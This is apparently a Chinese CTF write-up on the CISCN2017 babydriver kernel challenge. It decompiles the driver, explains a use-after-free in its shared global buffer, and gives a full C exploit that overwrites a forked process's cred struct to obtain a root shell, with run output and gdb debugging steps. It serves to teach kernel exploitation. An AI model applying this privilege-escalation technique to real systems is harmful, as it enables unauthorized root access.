# 写在前面

>
> 这篇文章目的在于简单介绍内核PWN题，揭开内核的神秘面纱。背后的知识点包含Linux驱动和内核源码，学习路线非常陡峭。也就是说，会一道Linux内核PWN需要非常多的铺垫知识，如果要学习可以先从UNICORN、QEMU开始看起，然后看Linux驱动的内容，最后看Linux的内存管理、进程调度和文件的实现原理。至于内核API函数不用死记硬背，用到的时候再查都来得及。

# 题目概述

这题是参考ctf-wiki上的内核例题，题目名称CISCN2017_babydriver，是一道简单的内核入门题，所牵涉的知识点并不多。题目附件可以在ctf-wiki的GitHub仓库找到：<https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/kernel/CISCN2017-babydriver>。

  * 首先将题目附件下载下来，解压后得到所有的文件如下：
    
        .  
    ├── boot.sh     # 启动脚本，运行这个脚本来启动QEMU  
    ├── bzImage     # 压缩过的内核镜像  
    └── rootfs.cpio # 作为初始RAM磁盘的文件

  * 查看启动脚本boot.sh内容如下：
    
        #!/bin/bash  
    ​  
    qemu-system-x86_64 \  
    -initrd rootfs.cpio \      # 指定使用rootfs.cpio作为初始RAM磁盘。可以使用cpio 命令提取这个cpio文件，提取出里面的需要的文件，比如init脚本和babydriver.ko的驱动文件。提取操作的命令放在下面的操作步骤中  
    -kernel bzImage \          # 使用当前目录的bzImage作为内核镜像  
    -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \  # 使用后面的字符串作为内核命令行  
    -enable-kvm \              # 启用加速器  
    -monitor /dev/null \       # 将监视器重定向到字符设备/dev/null  
    -m 64M \                   # 参数设置RAM大小为64M  
    --nographic \             # 参数禁用图形输出并将串行I/O重定向到控制台  
    -smp cores=1,threads=1 \   # 参数将CPU设置为1核心1线程  
    -cpu kvm64,+smep           # 参数选择CPU为kvm64，开启了smep保护，无法在ring 0级别执行用户代码

  * 文件bzImage是压缩编译的内核镜像文件。有些题目会提供vmlinux文件，它是未被压缩的镜像文件。这个题目没有提供，但也不要紧，可以用脚本提取出vmlinux，而使用vmlinux的目的也就是找gadget，提取vmlinux的脚本也可以在Linux的GitHub上找到：<https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux>。把代码复制到文件中，保存为extract-vmlinux，然后赋予执行权限。提取vmlinux命令如下：
    
        ./extract-vmlinux ./bzImage > vmlinux

可以使用ropper在提取的vmlinux中搜寻gadget，ropper比ROPgadget快很多：

    
        ropper --file ./vmlinux --nocolor > g1

  * rootfs.cpio是启动内核的RAM磁盘文件，可以把它看作一个微型Linux文件系统。使用`file`命令查看可以看到它是gzip格式：
    
        unravel@unravel:~/pwn$ file rootfs.cpio  
    rootfs.cpio: gzip compressed data, last modified: Tue Jul  4 08:39:15 2017, max compression, from Unix, original size modulo 2^32 2844672

我们将rootfs.cpio改名为rootfs.cpio.gz，然后将它解压出来：

    
        unravel@unravel:~/pwn$ ls  
    boot.sh bzImage rootfs.cpio  
    ​  
    unravel@unravel:~/pwn$ mv rootfs.cpio rootfs.cpio.gz  
    unravel@unravel:~/pwn$ ls  
    boot.sh bzImage rootfs.cpio.gz  
    ​  
    unravel@unravel:~/pwn$ gunzip rootfs.cpio.gz  
    unravel@unravel:~/pwn$ ls  
    boot.sh bzImage rootfs.cpio  
    ​  
    unravel@unravel:~/pwn$ file rootfs.cpio  
    rootfs.cpio: ASCII cpio archive (SVR4 with no CRC)

因为rootfs.cpio里面包含一些文件系统，它的文件比较多，我们可以创建一个文件夹，然后用`cpio`命令把所有文件提取到新建的文件夹下，保证一个干净的根目录，后面也将内容重新打包：

    
        unravel@unravel:~/pwn$ mkdir core && cp rootfs.cpio core && cd core && cpio -idmv < rootfs.cpio  
    ​  
    unravel@unravel:~/pwn/core$ ls  
    bin etc home init lib linuxrc proc rootfs.cpio sbin sys tmp usr

# 启动文件和驱动程序函数

  * 在我们上一步解压完rootfs.cpio之后可以看到它就是Linux的文件系统。在根目录下里面有一个「init」文件，它决定启动哪些程序，比如执行某些脚本和启动shell。它的内容如下，除了`insmod`命令之外都是Linux的基本命令便不再赘述：
    
        #!/bin/sh  
    ​  
    mount -t proc none /proc  
    mount -t sysfs none /sys  
    mount -t devtmpfs devtmpfs /dev  
    chown root:root flag  
    chmod 400 flag  
    exec 0</dev/console  
    exec 1>/dev/console  
    exec 2>/dev/console  
    ​  
    insmod /lib/modules/4.4.72/babydriver.ko  # insmod命令加载了一个名为babydriver.ko的驱动，根据一般的PWN题套路，这个就是有漏洞的LKM了  
    chmod 777 /dev/babydev  
    echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"   
    setsid cttyhack setuidgid 1000 sh  
    ​  
    umount /proc  
    umount /sys  
    poweroff -d 0  -f

  * 在init文件中看到用`insmod`命令加载了babydriver.ko驱动，那么我们把这个驱动拿出来，检查一下开启的保护：
    
        unravel@unravel:~/pwn/core/lib/modules/4.4.72$ checksec --file=babydriver.ko  
    RELRO           STACK CANARY     NX           PIE             RPATH     RUNPATHSymbolsFORTIFYFortifiedFortifiable FILE  
    No RELRO       No canary found   NX disabled   Not an ELF file   No RPATH   No RUNPATH   64 Symbols     No00babydriver.ko

可以看到程序保留了符号信息，其他保护都没有开启

  * 把驱动程序放到IDA里面查看程序逻辑，除了`init`初始化和`exit`外还有5个函数：

    * `babyrelease`：主要功能是释放空间
        
                int __fastcall babyrelease(inode *inode, file *filp)  
        {  
        _fentry__(inode, filp);  
        kfree(babydev_struct.device_buf);  
        printk("device release\n");  
        return 0;  
        }

    * `babyopen`：调用`kmem_cache_alloc_trace`函数申请一块大小为64字节的空间，返回值存储在`device_buf`中，并设置`device_buf_len`
        
                int __fastcall babyopen(inode *inode, file *filp)  
        {  
        _fentry__(inode, filp);  
        babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 64LL);  
        babydev_struct.device_buf_len = 64LL;  
        printk("device open\n");  
        return 0;  
        }

    * `babyioctl`：定义0x10001的命令，这条命令可以释放刚才申请的`device_buf`，然后重新申请一个用户传入的内存，并设置`device_buf_len`
        
                __int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)  
        {  
        size_t v3; // rdx  
        size_t v4; // rbx  
        ​  
        _fentry__(filp, command);  
        v4 = v3;  
        if ( command == 0x10001 )  
        {  
        kfree(babydev_struct.device_buf);  
        babydev_struct.device_buf = (char *)_kmalloc(v4, 0x24000C0LL);  
        babydev_struct.device_buf_len = v4;  
        printk("alloc done\n");  
        return 0LL;  
        }  
        else  
        {  
        printk(&unk_2EB);  
        return -22LL;  
        }  
        }

    * `babywrite`：`copy_from_user`是从用户空间拷贝数据到内核空间，应当接受三个参数`copy_from_user(char*, char*,int)`，IDA里面是没有识别成功，需要手动按Y键修复。`babywrite`函数先检查长度是否小于`device_buf_len`，然后把 `buffer`中的数据拷贝到 `device_buf`中
        
                ssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)  
        {  
        size_t v4; // rdx  
        ssize_t result; // rax  
        ssize_t v6; // rbx  
        ​  
        _fentry__(filp, buffer);  
        if ( !babydev_struct.device_buf )  
        return -1LL;  
        result = -2LL;  
        if ( babydev_struct.device_buf_len > v4 )  
        {  
        v6 = v4;  
        copy_from_user(babydev_struct.device_buf, (char *)buffer, v4);  
        result = v6;  
        }  
        return result;  
        }

    * `babyread`：和`babywrite`差不多，不过是把`device_buf`拷贝到`buffer`中
        
                ssize_t __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)  
        {  
        size_t v4; // rdx  
        ssize_t result; // rax  
        ssize_t v6; // rbx  
        ​  
        _fentry__(filp, buffer);  
        if ( !babydev_struct.device_buf )  
        return -1LL;  
        result = -2LL;  
        if ( babydev_struct.device_buf_len > v4 )  
        {  
        v6 = v4;  
        copy_to_user(buffer, babydev_struct.device_buf, v4);  
        result = v6;  
        }  
        return result;  
        }

# 漏洞点和利用思路

  * · 值得注意的是驱动程序中的函数操作都使用同一个变量`babydev_struct`，而`babydev_struct`是全局变量，漏洞点在于多个设备同时操作这个变量会将变量覆盖为最后改动的内容，没有对全局变量上锁，导致条件竞争。![1640141999_61c294afa3340ec12d609.png!small](https://image.3001.net/images/20211222/1640141999_61c294afa3340ec12d609.png!small)

  * · 我们使用`ioctl`同时打开两个设备，第二次打开的内容会覆盖掉第一次打开设备的`babydev_struct`，如果释放第一个，那么第二个理论上也被释放了，实际上并没有，就造成了一个UAF

  * · 释放其中一个后，使用`fork`，那么这个新进程的`cred`空间就会和之前释放的空间重叠

  * · 利用那个没有释放的描述符对这块空间写入，把`cred`结构体中的`uid`和`gid`改为0，就可实现提权

  * · 还有在修改时需要知道`cred`结构的大小，可以根据内核版本可以查看源码，计算出`cred`结构大小是0xa8，不同版本的内核源码这个结构体的大小都不一样

# exp代码

    
    
    #include <stdio.h>  
    #include <stdlib.h>  
    #include <unistd.h>  
    #include <fcntl.h>  
    #include <sys/wait.h>  
    #include <sys/stat.h>  
    ​  
    int main()  
    {  
    // 打开两次设备  
    int fd1 = open("/dev/babydev", 2);  
    int fd2 = open("/dev/babydev", 2);  
    ​  
    // 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)  
    ioctl(fd1, 0x10001, 0xa8);  
    ​  
    // 释放 fd1  
    close(fd1);  
    ​  
    // 新起进程的 cred 空间会和刚刚释放的 babydev_struct 重叠  
    int pid = fork();  
    if(pid < 0)  
    {  
    puts("[*] fork error!");  
    exit(0);  
    }  
    ​  
    else if(pid == 0)  
    {  
    // 通过更改 fd2，修改新进程的 cred 的 uid，gid 等值为0  
    char zeros[30] = {0};  
    write(fd2, zeros, 28);  
    ​  
    if(getuid() == 0)  
    {  
    puts("[+] root now.");  
    system("/bin/sh");  
    exit(0);  
    }  
    }  
    ​  
    else  
    {  
    wait(NULL);  
    }  
    close(fd2);  
    ​  
    return 0;  
    }

# 执行exp

需要将编写的exp编译成可执行文件，然后把它复制到rootfs.cpio提取出来的文件系统中，再将文件系统重新打包成cpio，这样在内核重新运行的时候就有exp这个文件了。

  * 将exp编译好，注意需要改为静态编译，因为我们的内核是没有动态链接的：
    
        unravel@unravel:~/pwn$ gcc exp.c -static -o exp

  * 接下来我们复制exp到文件系统下，然后使用`cpio`命令重新打包：
    
        unravel@unravel:~/pwn$ cp exp core/tmp/  
    unravel@unravel:~/pwn$ cd core/  
    unravel@unravel:~/pwn/core$ ls  
    bin  etc  home  init  lib  linuxrc  proc  rootfs.cpio  sbin  sys  tmp  usr  
    ​  
    unravel@unravel:~/pwn/core$ find . | cpio -o --format=newc > rootfs.cpio  
    cpio: File ./rootfs.cpio grew, 3522560 new bytes not copied  
    14160 blocks  
    ​  
    unravel@unravel:~/pwn/core$ cp rootfs.cpio ..

  * 下一步就可以重新运行内核了。执行boot.sh启动内核后，在刚才拷贝的/tmp目录下找到exp可执行程序：
    
        / $ ls -la /tmp/  
    total 864  
    drwxrwxr-x    2 ctf      ctf              0 Dec 16 09:35 .  
    drwxrwxr-x   13 ctf      ctf              0 Dec 17 08:35 ..  
    -rwxrwxr-x    1 ctf      ctf         883168 Dec 17 08:30 exp

  * 执行后可得到root权限，提权成功：
    
        / $ id  
    uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)  
    ​  
    / $ /tmp/exp  
    [  115.517513] device open  
    [  115.522342] device open  
    [  115.527241] alloc done  
    [  115.532132] device release  
    [+] root now.  
    ​  
    / # id  
    uid=0(root) gid=0(root) groups=1000(ctf)

# 调试

  * 可以在boot.sh文件中添加`-s`参数来使用gdb调试，它默认端口1234。也可以指定端口号进行调试，只需要使用`-gdb tcp:port`即可。在启动的内核中使用`lsmod`查看加载的驱动基地址，得到0xffffffffc0000000，然后启动gdb，使用`target remote`指定调试IP和端口号进行调试，然后添加babydriver的符号信息，过程如下：
    
        # 在QEMU运行的内核中运行如下命令  
    / $ lsmod  
    babydriver 16384 0 - Live 0xffffffffc0000000 (OE)
    
        # 启动gdb，配置调试信息  
    gdb -q  
    ​  
    gef➤ target remote localhost:1234  
    Remote debugging using localhost:1234  
    ​  
    gef➤ add-symbol-file pwn/core/lib/modules/4.4.72/babydriver.ko 0xffffffffc0000000  
    add symbol table from file "pwn/core/lib/modules/4.4.72/babydriver.ko"  
    Reading symbols from pwn/core/lib/modules/4.4.72/babydriver.ko...

  * 这里建议使用gef插件，pwndbg和peda调试内核总有一些玄学问题。如果gef报错context相关问题（如下图），在gdb中输入命令`python set_arch()`就可以查看调试上下文了：![1640142132_61c2953420258c1338831.png!small](https://image.3001.net/images/20211222/1640142132_61c2953420258c1338831.png!small)我们之前在gdb中使用`add-symbol-file`命令加载了babydriver.ko的符号信息，并指定了加载基地址，在下断点的时候可以直接使用符号来打断点：![1640142151_61c295479cdb19040b95a.png!small](https://image.3001.net/images/20211222/1640142151_61c295479cdb19040b95a.png!small)

# 总结

通过一道题认识了内核PWN的解题步骤，以及如何对内核进行调试。对于不知道用法的内核函数和结构体，可以在manned.org网站或者源码中查看。

# 参考资料

CTF-WIKI链接：<https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/uaf/#_2>

Linux在线源码：<https://elixir.bootlin.com/linux/v4.4.72/source/mm/slab.c#L3431>

MannedOrg：<https://manned.org/kmalloc.3>

QEMU手册：<https://www.qemu.org/docs/master/system/quickstart.html>

UNICORN：<https://www.unicorn-engine.org/docs/>

